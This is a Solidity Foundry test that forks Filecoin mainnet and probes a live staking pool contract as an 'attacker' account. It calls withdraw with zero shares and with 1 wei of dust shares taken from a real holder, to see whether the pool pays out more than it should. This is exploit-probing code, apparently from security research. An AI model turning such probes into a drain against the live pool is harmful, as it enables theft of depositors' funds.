// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// Debug: what exactly does pool.withdraw(uint256) do for an account with zero rSFT?
contract WithdrawDebugTest is Test {
    address constant POOL = 0x147122D1EBdA76E4910ccdC53aEb6a58605Eb58E;
    address attacker = address(0xA11CE);

    function setUp() public {
        string memory rpc = vm.envOr("FIL_RPC_URL", string("https://filecoin.drpc.org"));
        vm.createSelectFork(rpc, 6_457_969);
        vm.deal(attacker, 100 ether);
    }

    function _snap(string memory tag) internal {
        emit log_named_string("---", tag);
        emit log_named_uint("attacker FIL", attacker.balance);
        emit log_named_uint("pool FIL", POOL.balance);
        (bool ok, bytes memory ret) = POOL.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (ok) emit log_named_uint("rSFT supply", abi.decode(ret, (uint256)));
        (ok, ret) = POOL.staticcall(abi.encodeWithSignature("balanceOf(address)", attacker));
        if (ok) emit log_named_uint("attacker rSFT", abi.decode(ret, (uint256)));
    }

    function test_debug_withdraw_amount() public {
        _snap("before");
        vm.prank(attacker);
        (bool ok, bytes memory ret) = POOL.call(abi.encodeWithSelector(bytes4(0x2e1a7d4d), uint256(1e18)));
        emit log_named_string("withdraw(1e18) ok", ok ? "yes" : "no");
        emit log_named_bytes("ret", ret);
        _snap("after withdraw(1e18)");

        vm.prank(attacker);
        (ok, ret) = POOL.call(abi.encodeWithSelector(bytes4(0x2e1a7d4d), uint256(10e18)));
        emit log_named_string("withdraw(10e18) ok", ok ? "yes" : "no");
        _snap("after withdraw(10e18)");

        // try a big one
        vm.prank(attacker);
        (ok, ret) = POOL.call(abi.encodeWithSelector(bytes4(0x2e1a7d4d), uint256(53e18)));
        emit log_named_string("withdraw(53e18) ok", ok ? "yes" : "no");
        _snap("after withdraw(53e18)");
    }

    /// Attacker holds a dust amount of rSFT (1 wei) — can they withdraw more than 1 wei?
    function test_debug_withdraw_with_dust_shares() public {
        // rSFT is the pool token itself; move 1 wei from an existing holder
        address holder = 0x561c6C878872BfbDA3A946BBf99b16247000c5d1;
        vm.prank(holder);
        (bool okT, ) = POOL.call(abi.encodeWithSignature("transfer(address,uint256)", attacker, uint256(1)));
        emit log_named_string("dust transfer ok", okT ? "yes" : "no");
        _snap("after dust");

        vm.prank(attacker);
        (bool ok, ) = POOL.call(abi.encodeWithSelector(bytes4(0x2e1a7d4d), uint256(53e18)));
        emit log_named_string("withdraw(53e18) with 1 wei ok", ok ? "yes" : "no");
        _snap("after withdraw(53e18) with dust");

        // and a tiny amount
        vm.prank(attacker);
        (ok, ) = POOL.call(abi.encodeWithSelector(bytes4(0x2e1a7d4d), uint256(1)));
        emit log_named_string("withdraw(1 wei) ok", ok ? "yes" : "no");
        _snap("after withdraw(1 wei)");
    }
}
